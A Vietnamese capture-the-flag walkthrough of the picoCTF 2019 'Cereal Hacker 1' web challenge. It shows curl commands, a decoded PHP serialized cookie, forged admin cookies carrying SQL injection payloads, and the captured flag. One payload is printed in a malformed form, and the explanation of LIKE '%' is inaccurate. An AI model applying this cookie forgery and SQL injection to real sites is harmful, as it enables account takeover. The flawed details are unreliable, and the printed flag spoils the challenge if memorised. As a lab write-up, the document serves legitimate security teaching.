# CEREAL-HACKER-1
### Thể loại: Web Exploitation.
### Thử thách: 
Đăng nhập vào tài khoản admin của trang web sau: https://2019shell1.picoctf.com/problem/32256/
### Gợi ý: không có
### Kiến thức nền:
 - Local file inclusion.
 - SQL injection.
 - HTTP cookie.
 - PHP Object injection.
### Giải quyết vấn đề:
Okay, trước tiên chúng ta hãy test thử trang login này nào.
![enter image description here](https://res.cloudinary.com/practicaldev/image/fetch/s--ge4uP4DX--/c_limit,f_auto,fl_progressive,q_auto,w_880/https://thepracticaldev.s3.amazonaws.com/i/q1glk24z4czgq8pl6nqr.png)

1/ Kiểm tra lỗ hổng SQL Injection: 
 - Tại mục username, thử nhập "admin" rồi nhập `'OR 1=1 --` tại mục password để test thử -> Invalid Login. 
 - Có khả năng Password đã được filter. Thử nhập ngay tại username là `admin--` rồi nhập random tại password-> Invalid Login.

2/ Kiểm tra lỗ hổng Local File Inclusion:
URL của trang login này là: https://2019shell1.picoctf.com/problem/32256/index.php?file=login. Hmm, đoạn `index.php?file=login` khiến mình khá là trigger:v Thay "login" bằng "admin" thử xem sao. Bật curl lên múa thôi nào các bạn:))
```html
root@antoine:~# curl https://2019shell1.picoctf.com/problem/32256/index.php?file=admin
<!DOCTYPE html>
<html>
<head>
<link href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T" crossorigin="anonymous">
<link href="style.css" rel="stylesheet">
<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js" integrity="sha384-JjSmVgyd0p3pXB1rRibZUAYoIIy6OrQ6VrjIEaFf/nJGzIxFDsf4x0xIM+B07jRM" crossorigin="anonymous"></script>
</head>
	
	<body>
		<div class="container">
			<div class="row">
				<div class="col-sm-9 col-md-7 col-lg-5 mx-auto">
					<div class="card card-signin my-5">
						<div class="card-body">
							<h5 class="card-title text-center">You are not admin!</h5>
							<form action="index.php" method="get">
								<button class="btn btn-lg btn-primary btn-block text-uppercase" name="file" value="login" type="submit" onclick="document.cookie='user_info=; expires=Thu, 01 Jan 1970 00:00:18 GMT; domain=; path=/;'">Go back to login</button>
							</form>
						</div>
					</div>
				</div>
			</div>
		</div>

	</body>
```
URL https://2019shell1.picoctf.com/problem/32256/index.php?file=admin dẫn ta đến một local file của web server như phía dưới:
![PicoCTF 2019: Cereal Hacker 2 (500p) - DEV](https://res.cloudinary.com/practicaldev/image/fetch/s--YnxtPU-W--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://thepracticaldev.s3.amazonaws.com/i/ffnkvrvpvxh0qxqrsro4.png)
F12 để check xem cookie thế nào thì cũng không thấy gì đặc biệt. Thôi thì bấm vào "Go back to login" để quay lại cái trang login ban đầu vậy:((
Trong lúc bắt đầu thấy nản vcl thì mình nảy ra ý tưởng: "Có tài khoản admin thì phải có tài khoản guest chứ nhỉ?" Nhập vào username và password đều là "guest" thử xem. Tada!
![picoCTF 2019 - cereal hacker 1](https://blog.kakaocdn.net/dn/cj4IyA/btqyYPR6PT0/ZK8nMXznDOfidw8oyK44O0/img.png) 
Khi nhập vào các mục của trang login, mình nhận thấy không có bất kì thay đổi gì đặc biệt trên thanh URL ngoài `file=regular_user` . Vậy nhiều khả năng input được truyền tới server bằng phương thức POST. Bật curl lên và xem dữ liệu HTTP POST được gửi tới server như nào thôi nào:3
Dùng lệnh: 
```console
curl https://2019shell1.picoctf.com/problem/32256/index.php?file=login --data "user=guest&pass=guest" -v 
```
Sau một hồi căng mắt dò từng dòng một trong đống output dài vê lờ thì mình đã tìm thấy một thứ khả nghi:
```console
Set-Cookie: user_info=TzoxMToicGVybWlzc2lvbnMiOjI6e3M6ODoidXNlcm5hbWUiO3M6NToiZ3Vlc3QiO3M6ODoicGFzc3dvcmQiO3M6NToiZ3Vlc3QiO30%253D;
```
Đây chính là [HTTP Cookie](https://viblo.asia/p/ban-da-hieu-ro-ve-http-cookie-djeZ1DvGKWz) trong header mà web browser gửi lên cho server.  Cookie user_info này rất có thể được mã hóa base64. Vào 1 trang [Base64 Decoder](https://www.base64decode.org/) để decode thử, ouput là: 

    O:11:"permissions":2:{s:8:"username";s:5:"guest";s:8:"password";s:5:"guest";}
Output ở phía trên trông khá giống như một [serialized](https://en.wikipedia.org/wiki/Serialization) object trong PHP, và object này thể hiện các thông tin bao gồm username và password. Cùng nhau phân tích output nào:
```
O:11:"permissions": --> object có tên là "permissions",độ dài của string "permissions" là 11 kí tự.
    2: --> số lượng thuộc tính của object "permissions", gồm username và password. 
        {
            s:8:"username"; s:5:"guest"; --> tên của thuộc tính name là một string độ dài 8, giá trị của nó là 1 string độ dài 5.
            s:8:"password"; s:5:"guest"; --> tên của thuộc tính password là một string độ dài 8, giá trị của nó là 1 string độ dài 5.  
        }
```
Object này chứa thông tin để xác thực tài khoản "guest". Vậy nếu chúng ta sửa username thành admin và sử dụng SQL injection để bypass password rồi gói payload này vào 1 [custom HTTP headers](https://www.keycdn.com/support/custom-http-headers)
rồi gửi nó ngược lại cho thằng server thì sao nhỉ? Okay, triển thôi (lưu ý phải thay đổi luôn cả độ dài của string ứng với từng mục nhập vào):

 ```
O:11:"permissions":2:{s:8:"username";s:5:"admin";s:8:"password";s:8:"' OR 1=1";}
```
Mã hóa base64 đống payload này. Sau đó gán output sau khi encode vào cookie user_info chúng ta sẽ gửi nó tới server thông qua URL https://2019shell1.picoctf.com/problem/32256/index.php?file=admin như sau:
```console 
curl https://2019shell1.picoctf.com/problem/32256/index.php?file=admin -H "Cookie: user_info=TzoxMToicGVybWlzc2lvbnMiOjI6e3M6ODoidXNlcm5hbWUiO3M6NToiYWRtaW4iO3M6ODoicGFzc3dvcmQiO3M6ODoiJyBPUiAxPTEiO30" && echo
```
Hic hic, server trả về đúng trang cũ (You are not admin!). Tiếp tục thử payload khác nào: 
 ```
O:11:"permissions":2:O:11:"permissions":2:{s:8:"username";s:5:"admin";s:8:"password";s:28:"Antoine' or password like '%";}
```
Trong đó `or password like '%` có nghĩa là "hoặc trường password của bản ghi có value bắt đầu bằng null". Mà không có string nào là không bắt đầu bằng null cả nên nó đúng với mọi user nằm trong table (chi tiết xem tại [đây](https://www.w3schools.com/sql/sql_like.asp)). Lặp lại các bước như phía trên ta thu được:

```html
<!DOCTYPE html>
<html>
<head>
<link href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T" crossorigin="anonymous">
<link href="style.css" rel="stylesheet">
<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js" integrity="sha384-JjSmVgyd0p3pXB1rRibZUAYoIIy6OrQ6VrjIEaFf/nJGzIxFDsf4x0xIM+B07jRM" crossorigin="anonymous"></script>
</head>
	
	<body>
		<div class="container">
			<div class="row">
				<div class="col-sm-9 col-md-7 col-lg-5 mx-auto">
					<div class="card card-signin my-5">
						<div class="card-body">
							<h5 class="card-title text-center">Welcome to the admin page!</h5>
							<h5 style="color:blue" class="text-center">Flag: picoCTF{2eb6a9439bfa7cb1fc489b237de59dbf}</h5>
						</div>
					</div>
				</div>
			</div>
		</div>

	</body>

</html>

```
Hai cái payload này chỉ là một số hàng chục payload mà mình đã thử:v Vì bài viết có hạn nên chỉ xin giới thiệu từng này:))) Các bạn có thể tham khảo các câu lệnh SQL để inject vào mục tiêu thông qua các cheat sheet nha:3

Anyway, this is the endgame!!!!
